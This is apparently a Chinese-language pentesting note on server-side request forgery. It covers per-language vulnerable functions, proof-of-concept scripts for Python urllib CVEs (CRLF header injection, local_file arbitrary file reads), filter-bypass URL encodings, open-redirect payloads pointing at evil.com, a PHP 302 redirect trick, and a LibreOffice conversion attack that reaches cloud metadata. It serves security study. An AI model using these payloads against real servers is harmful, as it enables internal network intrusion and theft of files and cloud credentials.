## SSRF原理& 描述
服务端请求伪造是由攻击者发起、服务端发起请求的安全漏洞。

产生的原因是服务端从其他服务获取数据但是没有对地址和协议做过滤和限制。

分类：
- 回显型
- 非回显型



## 不同语言中的SSRF

### PHP
常见函数：
- cURL
- file_get_contents

支持协议：
- http、https、ftp、gopher、telnet、dict、file 和 ldap

最好的是gopher和dict，可用于攻击内网的redis。

### Python
常见函数：
- urllib/urllib2
- requests

#### [CVE-2019-9740/9947] urllib2 in Python 2.x through 2.7.16 and urllib in Python 3.x through 3.7.3
```py
import sys
import urllib2

host = "192.168.85.1:7777?a=1 HTTP/1.1\r\nCRLF-injection: test\r\nTEST: 123"
url = "http://" + host + ":8080/test/?test=a"

try:

	info = urllib2.urlopen(url).info()
	print(info)

except Exception as e:
	raise e
```
测试：
```
$ python2 --version
Python 2.7.15+
$ python2 ssrf.py
```
结果：
```
ncat -klvn 7777
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::7777
Ncat: Listening on 0.0.0.0:7777
Ncat: Connection from 192.168.85.129.
Ncat: Connection from 192.168.85.129:59862.
GET /?a=1 HTTP/1.1
CRLF-injection: test
TEST: 123:8080/test/?test=a HTTP/1.1
Accept-Encoding: identity
Host: 192.168.85.1:7777
Connection: close
User-Agent: Python-urllib/2.7
```
成功注入了`\r\n`进行换行，把`:8080`当做了一个请求头的一部分。

参考：
- [CVE-2019-9740 Python urllib CRLF injection vulnerability 浅析](https://xz.aliyun.com/t/5123)


#### [CVE-2019-9948] urllib in Python 2.x through 2.7.16
这个版本的urllib支持`local_file/local-file`协议，可以读任意文件，当file协议被禁止后，可以用这个特性。
```py
import urllib
urllib.urlopen('local_file:///etc/hosts').read()
urllib.urlopen('local-file:///etc/hosts').read()
```

响应：
```
>>> urllib.urlopen('local_file:///etc/hosts').read()
'127.0.0.1\tlocalhost\n127.0.1.1\tubuntu\n192.168.170.1   cqq.com\n
```


### Java
相对于php而言,SSRF在Java中利用局限性较大,常见的类:
- HttpURLConnection
- URLConnection
- HttpClients

支持协议：
- http，https，file，ftp，mailto，jar，netdo

除非自己实现Socket，之外的应用层的协议都是不支持CRLF注入的（无法攻击redis）。weblogic的那个SSRF例外，因为它自己基于Socket实现的协议，没有对CRLF校验。


## SSRF发现&利用
portswigger详细讲述如何发现SSRF：
https://portswigger.net/web-security/ssrf

1、WEB参数点
- url，callback，img等
- HTML/PDF/img的渲染处
- xml、docx、odt等文件（XXE）
- 通过SVG文件上传，参考https://github.com/allanlw/svg-cheatsheet
- 反向代理/负载均衡处：请求头，Host，Referer，X-Forwarded-For


2、重定向
- 重定向到指定Host下（Location: http://127.0.0.1）
- 重定向更改协议（Location: gopher://127.0.0.1:11211/_data）
- 结合重定向漏洞
- 绕过重定向保护（301,302,307等）


3、绕过黑名单保护
### URL解析绕过
- http://evil$google.com，
- http://127.1.1.1:80\@127.2.2.2:80/，
- http://127.1.1.1:80\@@127.2.2.2:80/，
- 0://evil.com:80;http://google.com:80/ 
- Unicode编码
- 地址进制转换（http://0177.0.0.01，http://2130706433/， http://0x7f.0x0.0x0.0x1， http://0177.0x0.0x0.1）
- localhost变换
- IPv6地址变换


4、支持的协议
- ftp（tftp、sftp）
- http（https）
- unc路径
- file、netdoc（Java）文件读取
- jar、dict、gopher、ldap


5、DNS重绑定


6、利用
- 内网扫描（HTTP服务、redis服务）
- 文件读取（依赖协议）
- 绕过403、401等localhost


### 参考
- https://github.com/hackerscrolls/SecurityTips/blob/master/MindMaps/SSRF.png
- [SSRF Tips](https://blog.safebuff.com/2016/07/03/SSRF-Tips/)
- https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/
- [多个应用的盲SSRF](https://github.com/assetnote/blind-ssrf-chains)
- [LibreOffice转换PDF导致的SSRF](https://r4id3n.medium.com/ssrf-exploitation-in-spreedsheet-to-pdf-converter-2c7eacdac781)
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery
- [SSRF安全指北](https://mp.weixin.qq.com/s/EYVFHgNClgNGrk_92PZ90A)
- [浅析SSRF在CTF中的各种实现方式](https://xz.aliyun.com/t/8613)
- https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/
- https://infosecwriteups.com/exploiting-server-side-request-forgery-ssrf-vulnerability-faeb7ddf5d0e


#### LibreOffice转换PDF导致的SSRF
- `<img src="http://127.0.0.1">`，发现并不能拿到127的内容，有安全机制；
- `<img src=”http://myvps:1337”>`，vps接收到响应，根据UA得知是LibreOffice，
- 利用上传xlsx的功能，在content.xml中注入payload，在转换成pdf过程中实现SSRF拿到敏感信息（[169.254.169.254]的metadata）



### 常用payload
```
http://www.aaa.com?returnUrl=http://www.aaa.com.evil.com

http://www.aaa.com?returnUrl=http://www.evil.com/www.aaa.com

http://www.aaa.com?returnUrl=http://www.xxxaaa.com

若再配合URL的各种特性符号，绕过姿势可是多种多样。比如

利用问号?：

http://www.aaa.com?returnUrl=http://www.evil.com?www.aaa.com

利用反斜线\：

http://www.aaa.com?returnUrl=http://www.evil.com\www.aaa.com

http://www.aaa.com?returnUrl=http://www.evil.com\\www.aaa.com

利用@符号：

http://www.aaa.com?returnUrl=http://www.aaa.com@www.evil.com

利用井号#：

http://www.aaa.com?returnUrl=http://www.evil.com#www.aaa.com

http://www.aaa.com?returnUrl=http://www.evil.com#www.aaa.com?www.aaa.com

缺失协议：

http://www.aaa.com?returnUrl=/www.evil.com

http://www.aaa.com?returnUrl=//www.evil.com
```


### SSRF攻防

常见的修复方法：
```py
if check_ssrf(url):
    do_curl(url)
else:
    print("error")
```
其中获取host和判断host的逻辑都是在`check_ssrf`中实现的。


攻击方式：
#### 30x跳转
如果限制了只支持

php构造302跳转：
```php
<?php
header('Location: http://192.168.1.142:4444/attack?arbitrary=params');
```

#### URL解析绕过

#### DNS rebinding

## Ref
- https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery
- https://pravinponnusamy.medium.com/ssrf-payloads-f09b2a86a8b4
